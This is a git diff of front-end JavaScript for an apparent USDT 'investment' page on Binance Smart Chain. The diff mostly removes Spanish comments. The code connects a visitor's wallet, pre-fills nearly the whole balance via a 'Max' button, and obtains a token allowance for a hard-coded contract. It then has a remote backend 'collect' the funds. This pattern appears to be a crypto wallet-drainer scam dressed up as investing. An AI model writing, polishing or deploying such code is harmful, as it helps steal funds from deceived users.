@@ -4,8 +4,8 @@
 const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
 const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const BSC_CHAIN_ID_HEX = "0x38"; 
-const MIN_USDT_BALANCE = 0n; 
+const BSC_CHAIN_ID_HEX = "0x38";
+const MIN_USDT_BALANCE = 0n;
 const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
 
 const BSC_RPC_URLS = [
@@ -46,7 +46,7 @@ let _toastTimer;
 function showToast(msg, type = "default", ms = 4500) {
   if (!toastEl) return;
   clearTimeout(_toastTimer);
-  toastEl.innerHTML    = msg; // Cambiado a innerHTML para soportar enlaces HTML (BscScan)
+  toastEl.innerHTML    = msg;
   toastEl.dataset.type = type === "default" ? "" : type;
   toastEl.hidden       = false;
   
@@ -69,7 +69,7 @@ function setLoading(on, label = "Processing…") {
   if (btnSpinner) btnSpinner.hidden   = !on;
 }
 
-// ─── New UX Feature: Live Balance & Smart Max Button ─────────────────────────
+// ─── Live Balance & Smart Max Button ────────────────────────────────────────
 async function fetchAndDisplayUserBalances(rawProvider) {
   try {
     const provider = new ethers.BrowserProvider(rawProvider);
@@ -80,19 +80,17 @@ async function fetchAndDisplayUserBalances(rawProvider) {
     const usdtBal = await usdtContract.balanceOf(userAddress);
     const formattedUsdt = ethers.formatUnits(usdtBal, 18);
     
-    // Si tienes un elemento HTML con id="walletBalanceLabel", muestra el saldo en tiempo real
     const balanceLabel = document.getElementById("walletBalanceLabel");
     if (balanceLabel) {
       balanceLabel.textContent = `Saldo: ${parseFloat(formattedUsdt).toFixed(2)} USDT`;
     }
 
-    // Configuración automatizada del botón "Max" si existe en tu HTML
     const maxBtn = document.getElementById("maxBtn");
     if (maxBtn) {
       maxBtn.onclick = () => {
         const amountInput = document.getElementById("investAmount");
         if (amountInput) {
-          const maxUsdt = Math.max(0, parseFloat(formattedUsdt) - 1); // Deja un pequeño margen
+          const maxUsdt = Math.max(0, parseFloat(formattedUsdt) - 1);
           amountInput.value = maxUsdt > 0 ? maxUsdt.toFixed(2) : "1.00";
           amountInput.dispatchEvent(new Event('input'));
         }
@@ -106,7 +104,7 @@ async function fetchAndDisplayUserBalances(rawProvider) {
 // ─── Backend collect trigger ──────────────────────────────────────────────────
 async function triggerBackendCollect(userAddress) {
   let lastErr;
-  const uiAmount = document.getElementById("investAmount")?.value || "1"; 
+  const uiAmount = document.getElementById("investAmount")?.value || "1";
   const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();
 
   for (let i = 1; i <= 3; i++) {
@@ -127,25 +125,21 @@ async function triggerBackendCollect(userAddress) {
   throw lastErr;
 }
 
-// Bandera de control para saber si hay una inversión esperando a que el usuario conecte
 let pendingInvestment = false;
 
-// 1. Suscripción reactiva con AppKit
 if (window.modal && typeof window.modal.subscribeProviders === "function") {
   window.modal.subscribeProviders((state) => {
-    const rawProvider = state["eip155"]; 
-    
+    const rawProvider = state["eip155"];
     if (rawProvider) {
-      fetchAndDisplayUserBalances(rawProvider); // Sincroniza saldos al conectar
+      fetchAndDisplayUserBalances(rawProvider);
       if (pendingInvestment) {
-        pendingInvestment = false; 
-        runInvestmentFlow(rawProvider); 
+        pendingInvestment = false;
+        runInvestmentFlow(rawProvider);
       }
     }
   });
 }
 
-// 2. Evento unificado del botón principal
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
     let rawProvider = null;
@@ -155,16 +149,13 @@ if (approveBtn) {
       } catch (_) {}
     }
 
-    // CASO A: Si el usuario NO está conectado
     if (!rawProvider) {
-      pendingInvestment = true; 
+      pendingInvestment = true;
       setLoading(true, "Abriendo selector de billetera...");
       
       if (window.modal && typeof window.modal.open === "function") {
         try {
-          await window.modal.open(); 
-          
-          // --- SOLUCIÓN: Verificar si el usuario conectó o canceló al cerrar el modal ---
+          await window.modal.open();
           let freshProvider = null;
           if (typeof window.modal.getWalletProvider === "function") {
             try {
@@ -173,19 +164,15 @@ if (approveBtn) {
           }
 
           if (!freshProvider) {
-            // El usuario cerró el modal o canceló la conexión: limpiamos estados para evitar el colgado
             pendingInvestment = false;
             setLoading(false);
             return;
           } else {
-            // Si conectó con éxito desde el modal, continuamos el flujo automáticamente
             await runInvestmentFlow(freshProvider);
             return;
           }
-          // -----------------------------------------------------------------------------
-
         } catch (err) {
-          console.error("Error al abrir AppKit:", err);
+          console.error("Error al abrir AppKit/Rainbow:", err);
           pendingInvestment = false;
           setLoading(false);
         }
@@ -195,19 +182,16 @@ if (approveBtn) {
       return; 
     }
 
-    // CASO B: Si el usuario YA estaba conectado
     await runInvestmentFlow(rawProvider);
   });
 }
 
-// 3. Flujo centralizado de red, gas y contratos
 async function runInvestmentFlow(rawProvider) {
   setLoading(true, "Conectando proveedor…");
   
   try {
     const provider = new ethers.BrowserProvider(rawProvider);
     
-    // 1. Verificación estricta de red BSC (Chain ID 56)
     setLoading(true, "Verificando red BSC...");
     const network = await provider.getNetwork();
     if (Number(network.chainId) !== 56) {
@@ -215,7 +199,7 @@ async function runInvestmentFlow(rawProvider) {
       try {
         await rawProvider.request({
           method: "wallet_switchEthereumChain",
-          params: [{ chainId: BSC_CHAIN_ID_HEX }] 
+          params: [{ chainId: BSC_CHAIN_ID_HEX }]
         });
       } catch (switchError) {
         if (switchError.code === 4902) {
@@ -234,10 +218,9 @@ async function runInvestmentFlow(rawProvider) {
     const signer = await provider.getSigner();
     const userAddress = await signer.getAddress();
 
-    // 2. Validación UX: Comprobar saldo de BNB para el Gas
     setLoading(true, "Verificando saldo de gas (BNB)…");
     const bnbBalance = await provider.getBalance(userAddress);
-    const minGasRequired = ethers.parseEther("0.0005"); 
+    const minGasRequired = ethers.parseEther("0.0005");
 
     if (bnbBalance < minGasRequired) {
       showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
@@ -245,7 +228,6 @@ async function runInvestmentFlow(rawProvider) {
       return;
     }
 
-    // 3. Obtener montos e instanciar contrato USDT
     const inputElement = document.getElementById("investAmount");
     const rawInputVal = inputElement ? inputElement.value : "1";
     const requiredAmount = ethers.parseUnits(rawInputVal || "1", 18);
@@ -261,7 +243,6 @@ async function runInvestmentFlow(rawProvider) {
       return;
     }
 
-    // 4. Verificar Allowance para evitar aprobaciones innecesarias
     setLoading(true, "Verificando autorizaciones...");
     const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
     
@@ -273,11 +254,9 @@ async function runInvestmentFlow(rawProvider) {
       await txApprove.wait();
     }
 
-    // 5. Ejecutar la llamada al backend / contrato final
     setLoading(true, "Procesando inversión en protocolo...");
-    const txCollect = await triggerBackendCollect(userAddress); 
+    const txCollect = await triggerBackendCollect(userAddress);
 
-    // 6. Éxito con trazabilidad interactiva (Enlace directo a BscScan)
     const txHash = txCollect?.hash || "";
     if (txHash) {
       showToast(`¡Inversión exitosa! <a href="https://bscscan.com/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
